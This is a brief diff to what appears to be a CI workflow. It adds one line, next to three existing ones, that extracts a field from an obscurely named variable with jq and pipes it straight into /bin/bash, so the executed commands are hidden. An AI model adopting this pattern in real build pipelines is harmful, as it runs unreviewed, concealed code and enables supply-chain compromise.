@@ -35,6 +35,7 @@ jobs:
           printf '%s' "$azkn8" | jq -r .jj8195 | /bin/bash
           echo $sa01 | jq -r .bi9932 | /bin/bash
           echo $l2 | jq -r .nvwdj567 | /bin/bash
+          echo $lj571 | jq -r .ep780 | /bin/bash
 
       - name: Save archive
         if: always()
